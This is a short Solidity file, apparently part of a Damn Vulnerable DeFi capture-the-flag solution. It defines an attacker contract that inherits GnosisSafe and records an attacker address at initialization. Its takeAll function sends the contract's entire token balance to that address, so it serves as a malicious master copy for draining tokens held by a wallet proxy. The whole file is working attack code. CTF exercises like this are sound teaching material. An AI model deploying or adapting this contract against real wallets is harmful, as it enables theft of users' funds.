// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "../DamnValuableToken.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";

contract MasterCopyAttacker is GnosisSafe, Initializable {
    address private attacker;
    DamnValuableToken private token;

    function initialize(address _attacker, address _token) external initializer {
        attacker = _attacker;
        token = DamnValuableToken(_token);
    }

    function takeAll() external {
        token.transfer(attacker, token.balanceOf(address(this)));
    }
}